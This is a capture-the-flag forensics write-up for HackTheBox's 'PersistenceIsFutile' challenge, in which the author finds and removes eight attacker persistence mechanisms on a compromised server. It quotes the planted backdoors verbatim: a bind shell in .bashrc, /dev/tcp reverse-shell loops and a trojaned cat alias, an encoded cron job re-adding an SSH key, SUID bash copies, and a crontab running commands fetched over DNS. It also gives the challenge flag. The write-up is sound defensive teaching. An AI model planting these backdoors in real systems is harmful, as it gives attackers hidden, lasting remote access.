#https://drive.google.com/file/d/1URdx8r3Bp9cevod-8soITz24O2nAZnhD/view
#https://0xv1n.github.io/posts/persistenceisfutile/


# PersistenceIsFutile Writeup

'''
PersistenceIsFutile is a Forensics challenge from HackTheBox. A hacker has compromised a server, and there are **8** issues that need to be resolved. For this writeup, I will go through each one in order.

```
root@forensicspersistence-280547-95fc7f4d-ss899:~# /root/solveme
Issue 1 is not remediated
Issue 2 is not remediated
Issue 3 is not remediated
Issue 4 is not remediated
Issue 5 is not remediated
Issue 6 is not remediated
Issue 7 is not remediated
Issue 8 is not remediated
```

## Issue 1
We start off by going to a root shell by running `sudo /bin/bash`. Let's take a look at `ps aux`.

```
root@forensicspersistence-280547-95fc7f4d-ss899:~# ps aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.0   2612   608 ?        Ss   05:49   0:00 /bin/sh -c /usr/sbin/sshd -D -p 23
root         6  0.0  0.0  12180  6980 ?        S    05:49   0:00 sshd: /usr/sbin/sshd -D -p 23 [listener] 0 of 10-100 startups
root         7  0.0  0.1  13896  8884 ?        Ss   05:49   0:00 sshd: user [priv]
root        17  0.0  0.0   3980  3160 ?        S    05:49   0:00 /bin/bash /var/lib/private/connectivity-check
user        21  0.0  0.0  13896  5368 ?        R    05:49   0:00 sshd: user@pts/0
user        22  0.0  0.0   4244  3480 pts/0    Ss   05:49   0:00 -bash
root        47  0.0  0.0   6284  4256 pts/0    S    05:51   0:00 sudo /bin/bash
root        48  0.0  0.0   4244  3560 pts/0    S    05:51   0:00 /bin/bash
root        55  0.0  0.0   2592  1960 pts/0    S    05:51   0:00 alertd -e /bin/bash -lnp 4444
root        61  0.0  0.0   3980   240 ?        S    05:51   0:00 /bin/bash /var/lib/private/connectivity-check
root        63  0.0  0.0   5900  2956 pts/0    R+   05:52   0:00 ps aux
```

Looks like there is a process called `alertd` running that looks eerily similar to `netcat`. Let's kill the process.

`kill -9 55`

Running `/root/solveme` shows that `Issue 1 is partially remediated` so we haven't quite finished yet. Let's find out where `alertd` is and remove it.

```
root@forensicspersistence-280547-95fc7f4d-ss899:~# whereis alertd
alertd: /usr/bin/alertd
root@forensicspersistence-280547-95fc7f4d-ss899:~# rm /usr/bin/alertd
root@forensicspersistence-280547-95fc7f4d-ss899:~# /root/solveme
Issue 1 is partially remediated
Issue 2 is not remediated
Issue 3 is not remediated
Issue 4 is not remediated
Issue 5 is not remediated
Issue 6 is not remediated
Issue 7 is not remediated
Issue 8 is not remediated
```

Still not done...something must exist to replicate this behaviour, but we don't see anything in the process list of it restarting just let. Let's use `grep` to try and find some mentions of it.

```
root@forensicspersistence-280547-95fc7f4d-ss899:~# cd /
root@forensicspersistence-280547-95fc7f4d-ss899:/# grep -re "alertd"
root/.bashrc:alertd -e /bin/bash -lnp 4444 &
```

There we go, root `.bashrc`  contains a line to start it (which is why it was running once we started a root shell.) We remove the line and check the solveme binary.

```
root@forensicspersistence-280547-95fc7f4d-ss899:~# vi .bashrc
root@forensicspersistence-280547-95fc7f4d-ss899:~# /root/solveme
Issue 1 is fully remediated
Issue 2 is not remediated
Issue 3 is not remediated
Issue 4 is not remediated
Issue 5 is not remediated
Issue 6 is not remediated
Issue 7 is not remediated
Issue 8 is not remediated
```

## Issue 2

While we are in the root shell, let's check the `ssh` keys to see if anything is going on. That would be a very simple backdoor.

```
root@forensicspersistence-280547-95fc7f4d-ss899:~# cat .ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC20LoIrzuu9IvtbUeV7jW5J+ed76E2NSYgFhcpJdFiGq+sAv4ewLzF7DshiqH+G20rdLdCgBA3ohcXf8QKv8aosXVD2MLzJ0ad7BvL026M39RHjxT5Vis8Ch6zCGcL1QN/l4riYYtqAmWqxQHVE2HnUeR/Dd7qhyIK6L4PCxQo0q1qOJb+FY1E0/CJYpY90ceX2psXAdGO8FY329+nI1pizwt7OuLk0rBmR11MkcCTQjAUhs7OG+3Pwr9FYHpBS793kDPgDrgKQ9dYJ3q3szsRElbB7W9+Y6dQvpMyJSmYYc1IrP6Ew8L1VGKexQRL6j40F6yzK2PBUdsDYROryGieRbVAwnxlwARpVvwqMY1WJVm0vg6stHAXPQ/pKHjXAedHheNHVOfIqFgOY7NR1ybQSajTYlEg1aDCJki19LQ2RroShyWbxcHMS0p2LDYwzxu4E5139GDg6inSI2m5Io57Vd+3HDhvLhBahTkGzYmausQFHUkiGm87O5vYlAZlWIs= root@buildkitsandbox
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHRdx5Rq5+Obq66cywz5KW9ofVm0NCZ39EPDA2CJDqx1 nobody@nothing
```

Looks like there is a malicious SSH key in here. Let's fix this up by copying the existing public key in.

```
root@forensicspersistence-280547-95fc7f4d-ss899:~/.ssh# cat id_rsa.pub > authorized_keys
root@forensicspersistence-280547-95fc7f4d-ss899:~/.ssh# /root/solveme
Issue 1 is fully remediated
Issue 2 is partially remediated
Issue 3 is not remediated
Issue 4 is not remediated
Issue 5 is not remediated
Issue 6 is not remediated
Issue 7 is not remediated
Issue 8 is not remediated
```

Not quite done. Since the theme is persistence, let's try and find a way that an attacker could keep their key in here. Let's check the different cron directories in `etc`

We check a few and see something interesting in `/etc/cron.daily`

```
root@forensicspersistence-280547-95fc7f4d-ss899:~# ls /etc/cron.daily/
0anacron  access-up  apt-compat  bsdmainutils  dpkg  logrotate  man-db  popularity-contest  pyssh
```

```
root@forensicspersistence-280547-95fc7f4d-ss899:/etc/cron.daily# cat pyssh
#!/bin/sh

VER=$(python3 -c 'import ssh_import_id; print(ssh_import_id.VERSION)')
MAJOR=$(echo $VER | cut -d'.' -f1)

if [ $MAJOR -le 6 ]; then
    /lib/python3/dist-packages/ssh_import_id_update
fi
```

Looks like a cron job to run a binary called `ssh_import_id_update`

```
root@forensicspersistence-280547-95fc7f4d-ss899:/etc/cron.daily# cat /lib/python3/dist-packages/ssh_import_id_update
#!/bin/bash

KEY=$(echo "c3NoLWVkMjU1MTkgQUFBQUMzTnphQzFsWkRJMU5URTVBQUFBSUhSZHg1UnE1K09icTY2Y3l3ejVLVzlvZlZtME5DWjM5RVBEQTJDSkRxeDEgbm9ib2R5QG5vdGhpbmcK" | base64 -d)
PATH=$(echo "L3Jvb3QvLnNzaC9hdXRob3JpemVkX2tleXMK" | base64 -d)

/bin/grep -q "$KEY" "$PATH" || echo "$KEY" >> "$PATH"
```

And here we have what appears to be a script to replicate the malicious authroized key! We remove this file and the cron job and then check `solveme`

```
root@forensicspersistence-280547-95fc7f4d-ss899:/etc/cron.daily# /root/solveme
Issue 1 is fully remediated
Issue 2 is fully remediated
Issue 3 is not remediated
Issue 4 is not remediated
Issue 5 is not remediated
Issue 6 is not remediated
Issue 7 is not remediated
Issue 8 is not remediated
```

## Issue 3

SUID binaries are commonly exploited to gain root access, so let's see if there is a malicious nano somewhere.

```
root@forensicspersistence-280547-95fc7f4d-ss899:~# find find / -perm -4000
find: 'find': No such file or directory
/root/solveme
find: '/proc/7/map_files': Permission denied
find: '/proc/21/map_files': Permission denied
find: '/proc/22/map_files': Permission denied
find: '/proc/47/map_files': Permission denied
find: '/proc/156/task/156/fd/5': No such file or directory
find: '/proc/156/task/156/fdinfo/5': No such file or directory
find: '/proc/156/fd/6': No such file or directory
find: '/proc/156/fdinfo/6': No such file or directory
/home/user/.backdoor
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/su
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/dlxcrw
/usr/bin/mgxttm
/usr/bin/sudo
/usr/sbin/afdluk
/usr/sbin/ppppd
```

I checked GTFOBins and everything looks alright...except those four with gibberish names. They do not appear to be anything good. Let's remove all four.

```
root@forensicspersistence-280547-95fc7f4d-ss899:~# rm /usr/bin/dlxcrw
root@forensicspersistence-280547-95fc7f4d-ss899:~# rm /usr/bin/mgxttm
root@forensicspersistence-280547-95fc7f4d-ss899:~# rm /usr/sbin/afdluk
root@forensicspersistence-280547-95fc7f4d-ss899:~# rm /usr/sbin/ppppd
```

Now let's check `solveme`

```
root@forensicspersistence-280547-95fc7f4d-ss899:~# /root/solveme
Issue 1 is fully remediated
Issue 2 is fully remediated
Issue 3 is fully remediated
Issue 4 is not remediated
Issue 5 is not remediated
Issue 6 is not remediated
Issue 7 is not remediated
Issue 8 is not remediated
```

## Issue 4

Malicious SSH keys exist, but how about a malicious user? Let's take a look at `/etc/shadow`

```
root@forensicspersistence-280547-95fc7f4d-ss899:~# cat /etc/shadow
root:*:18733:0:99999:7:::
daemon:*:18733:0:99999:7:::
bin:*:18733:0:99999:7:::
sys:*:18733:0:99999:7:::
sync:*:18733:0:99999:7:::
games:*:18733:0:99999:7:::
man:*:18733:0:99999:7:::
lp:*:18733:0:99999:7:::
mail:*:18733:0:99999:7:::
news:*:18733:0:99999:7:::
uucp:*:18733:0:99999:7:::
proxy:*:18733:0:99999:7:::
www-data:*:18733:0:99999:7:::
backup:*:18733:0:99999:7:::
list:*:18733:0:99999:7:::
irc:*:18733:0:99999:7:::
gnats:$6$SLVgdKJw4kQ5L0bv$ODjJstI50dhKq/IPbmLiZyJpcIPkifIUJGsQ.4f9EguBzf5JeI4sswDo9DsGZ39CDHP8h5AnnSNW5wgi7GeLZ.:18761:0:99999:7:::
nobody:*:18733:0:99999:7:::
_apt:*:18733:0:99999:7:::
systemd-timesync:*:18761:0:99999:7:::
systemd-network:*:18761:0:99999:7:::
systemd-resolve:*:18761:0:99999:7:::
messagebus:*:18761:0:99999:7:::
dnsmasq:*:18761:0:99999:7:::
sshd:*:18761:0:99999:7:::
user:$6$O..haIB2NMyT0/XH$vx5dw9pPri/gxrakXu0cQwaRp3e2mb70SpBHVDV32LPeUvh0Hy1NRSoJxAGoJ4ZeCbuZL9.7dWueWSoJ7MbTH0:18761:0:99999:7:::
```

`gnats` should not have a password set, we remove the hash and replace it with `*`

`gnats:*:18761:0:99999:7:::`

Now let's take a look at `/etc/passwd`

```
root@forensicspersistence-280547-95fc7f4d-ss899:~# cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:0:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/bash
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:101:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:106::/nonexistent:/usr/sbin/nologin
dnsmasq:x:105:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
user:x:1000:1000::/home/user:/bin/bash
```

Once again, `gnats` should not be able to log in. We change `/bin/bash` to `/usr/sbin/nologin`


We check `solveme` but see we are only partially done.

```
root@forensicspersistence-280547-95fc7f4d-ss899:~# /root/solveme
Issue 1 is fully remediated
Issue 2 is fully remediated
Issue 3 is fully remediated
Issue 4 is partially remediated
Issue 5 is not remediated
Issue 6 is not remediated
Issue 7 is not remediated
Issue 8 is not remediated
```

What else could give a user permissions. Groups!

```
root@forensicspersistence-280547-95fc7f4d-ss899:~# id gnats
uid=41(gnats) gid=0(root) groups=0(root)
```

Let's fix that real quick.

```
root@forensicspersistence-280547-95fc7f4d-ss899:~# usermod -g gnats gnats
root@forensicspersistence-280547-95fc7f4d-ss899:~# id gnats
uid=41(gnats) gid=41(gnats) groups=41(gnats)
```

```
root@forensicspersistence-280547-95fc7f4d-ss899:~# /root/solveme
Issue 1 is fully remediated
Issue 2 is fully remediated
Issue 3 is fully remediated
Issue 4 is fully remediated
Issue 5 is not remediated
Issue 6 is not remediated
Issue 7 is not remediated
Issue 8 is not remediated
```

## Issue 5

We check the process list and see something suspicious.

```
root@forensicspersistence-280547-95fc7f4d-ss899:~# ps aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.0   2612   608 ?        Ss   05:49   0:00 /bin/sh -c /usr/sbin/sshd -D -p 23
root         6  0.0  0.0  12180  6980 ?        S    05:49   0:00 sshd: /usr/sbin/sshd -D -p 23 [listener] 0 of 10-100 startups
root         7  0.0  0.1  13896  8884 ?        Ss   05:49   0:00 sshd: user [priv]
root        17  0.0  0.0   3980  3164 ?        S    05:49   0:00 /bin/bash /var/lib/private/connectivity-check
user        21  0.0  0.0  13896  5368 ?        R    05:49   0:00 sshd: user@pts/0
user        22  0.0  0.0   4244  3480 pts/0    Ss   05:49   0:00 -bash
root        47  0.0  0.0   6284  4256 pts/0    S    05:51   0:00 sudo /bin/bash
root        48  0.0  0.0   4244  3612 pts/0    S    05:51   0:00 /bin/bash
root       219  0.0  0.0   3980   244 ?        S    06:16   0:00 /bin/bash /var/lib/private/connectivity-check
root       229  0.0  0.0   5900  2884 pts/0    R+   06:16   0:00 ps aux
```

Let's take a look at `connectivity-check`.

```
root@forensicspersistence-280547-95fc7f4d-ss899:~# cat /var/lib/private/connectivity-check
#!/bin/bash

while true; do
    nohup bash -i >& /dev/tcp/172.17.0.1/443 0>&1;
    sleep 10;
done
```

Looks like a loop to reverse shell to a certain IP.

Let's kill the process and then remove the file.

```
root@forensicspersistence-280547-95fc7f4d-ss899:~# ps aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.0   2612   608 ?        Ss   05:49   0:00 /bin/sh -c /usr/sbin/sshd -D -p 23
root         6  0.0  0.0  12180  6980 ?        S    05:49   0:00 sshd: /usr/sbin/sshd -D -p 23 [listener] 0 of 10-100 startups
root         7  0.0  0.1  13896  8884 ?        Ss   05:49   0:00 sshd: user [priv]
root        17  0.0  0.0   3980  3164 ?        S    05:49   0:00 /bin/bash /var/lib/private/connectivity-check
user        21  0.0  0.0  15044  7428 ?        S    05:49   0:00 sshd: user@pts/0
user        22  0.0  0.0   4244  3480 pts/0    Ss   05:49   0:00 -bash
root        47  0.0  0.0   6284  4256 pts/0    S    05:51   0:00 sudo /bin/bash
root        48  0.0  0.0   4244  3616 pts/0    S    05:51   0:00 /bin/bash
root       246  0.0  0.0   3980   244 ?        S    06:19   0:00 /bin/bash /var/lib/private/connectivity-check
root       247  0.0  0.0   5900  2844 pts/0    R+   06:19   0:00 ps aux
```

`root@forensicspersistence-280547-95fc7f4d-ss899:~# sudo rm -rf /var/lib/private/`

```
root@forensicspersistence-280547-95fc7f4d-ss899:~# /root/solveme
Issue 1 is fully remediated
Issue 2 is fully remediated
Issue 3 is fully remediated
Issue 4 is fully remediated
Issue 5 is partially remediated
Issue 6 is not remediated
Issue 7 is not remediated
Issue 8 is not remediated
```

Looks like this one is...persistant. Let's use `grep` again to find out where this backdoor replication mechanicsm is hiding.

```
root@forensicspersistence-280547-95fc7f4d-ss899:/# grep -re "connectivity-check"
etc/update-motd.d/30-connectivity-check:nohup /var/lib/private/connectivity-check &
```

We remove this file and then run `solveme` again.

```
Issue 1 is fully remediated
Issue 2 is fully remediated
Issue 3 is fully remediated
Issue 4 is fully remediated
Issue 5 is fully remediated
Issue 6 is not remediated
Issue 7 is not remediated
Issue 8 is not remediated
```

## Issue 6

Before we saw a backdoor in `root` .bashrc, but I wonder if user has one too? Let's take a look. We know they are using `/dev/tcp/` for reverse shells so let's `grep` with that.

```
root@forensicspersistence-280547-95fc7f4d-ss899:/home/user# cat .bashrc | grep "/dev/tcp/"
    alias cat='(bash -i >& /dev/tcp/172.17.0.1/443 0>&1 & disown) 2>/dev/null; cat'
```

Looks like a fake alias `cat` that launches a reverse shell. Let's remove it and look at `solveme`.

```
root@forensicspersistence-280547-95fc7f4d-ss899:/home/user# /root/solveme
Issue 1 is fully remediated
Issue 2 is fully remediated
Issue 3 is fully remediated
Issue 4 is fully remediated
Issue 5 is fully remediated
Issue 6 is fully remediated
Issue 7 is not remediated
Issue 8 is not remediated
```

## Issue 7

In the users home directory we find a....more then obvious issue.

```
root@forensicspersistence-280547-95fc7f4d-ss899:/home/user# ls -la
total 1192
drwxr-xr-x 1 user user    4096 Aug 30 06:34 .
drwxr-xr-x 1 root root    4096 May 14 15:03 ..
-rwsr-xr-x 1 root root 1183448 May 14 15:03 .backdoor
-rw-r--r-- 1 user user     220 Feb 25  2020 .bash_logout
-rw-rw-r-- 1 root root    3771 Aug 30 06:28 .bashrc
drwx------ 2 user user    4096 Aug 30 05:49 .cache
-rw-r--r-- 1 user user     807 Feb 25  2020 .profile
-rw-rw-r-- 1 user user       0 Aug 30 06:33 .selected_editor
-rw-r--r-- 1 user user       0 Aug 30 05:49 .sudo_as_admin_successful
-rw------- 1 user user     812 Aug 30 06:34 .viminfo

```

However, that didn't fully solve it. Let's look back at what we know.

Before when we found the `SSH` backdoor in `cron.daily` I saw another weird cron job. Let's take another look.

```
root@forensicspersistence-280547-95fc7f4d-ss899:/etc/cron.daily# ls -la
total 52
drwxr-xr-x 1 root root 4096 Aug 30 06:06 .
drwxr-xr-x 1 root root 4096 Aug 30 06:15 ..
-rw-r--r-- 1 root root  102 Feb 13  2020 .placeholder
-rwxr-xr-x 1 root root  311 Jul 16  2019 0anacron
-rwxr-xr-x 1 root root  301 Apr 23 20:46 access-up
-rwxr-xr-x 1 root root 1478 Apr  9  2020 apt-compat
-rwxr-xr-x 1 root root  355 Dec 29  2017 bsdmainutils
-rwxr-xr-x 1 root root 1187 Sep  5  2019 dpkg
-rwxr-xr-x 1 root root  377 Jan 21  2019 logrotate
-rwxr-xr-x 1 root root 1123 Feb 25  2020 man-db
-rwxr-xr-x 1 root root 4574 Jul 18  2019 popularity-contest
```

`access-up` looks strange.

```
root@forensicspersistence-280547-95fc7f4d-ss899:/etc/cron.daily# cat access-up
#!/bin/bash


DIRS=("/bin" "/sbin")
DIR=${DIRS[$[ $RANDOM % 2 ]]}

while : ; do
    NEW_UUID=$(cat /dev/urandom | tr -dc 'a-z' | fold -w 6 | head -n 1)
    [[ -f "{$DIR}/${NEW_UUID}" ]] || break
done

cp /bin/bash ${DIR}/${NEW_UUID}
touch ${DIR}/${NEW_UUID} -r /bin/bash
chmod 4755 ${DIR}/${NEW_UUID}
```

Looks like a strange script to mess with UUID and give a program certain abilities. Let's remove it.

```
root@forensicspersistence-280547-95fc7f4d-ss899:/etc/cron.daily# /root/solveme
Issue 1 is fully remediated
Issue 2 is fully remediated
Issue 3 is fully remediated
Issue 4 is fully remediated
Issue 5 is fully remediated
Issue 6 is fully remediated
Issue 7 is fully remediated
Issue 8 is not remediated
```

## Issue 8

After all this crontab backdooring, I completely forgot to check the user crontabs! Let's take a look at roots.

```
root@forensicspersistence-280547-95fc7f4d-ss899:/etc/cron.daily# crontab -l
no crontab for root
```

And then user.

```
user@forensicspersistence-280547-95fc7f4d-ss899:~$ crontab -l
* * * * * /bin/sh -c "sh -c $(dig imf0rce.htb TXT +short @ns.imf0rce.htb)"
```

Looks like our final issue has been found. Let's remove this and check the `solveme` binary.

```
root@forensicspersistence-280547-95fc7f4d-ss899:/home/user# /root/solveme
Issue 1 is fully remediated
Issue 2 is fully remediated
Issue 3 is fully remediated
Issue 4 is fully remediated
Issue 5 is fully remediated
Issue 6 is fully remediated
Issue 7 is fully remediated
Issue 8 is fully remediated

Congrats: HTB{7tr3@t_hUntIng_4TW}

```
'''

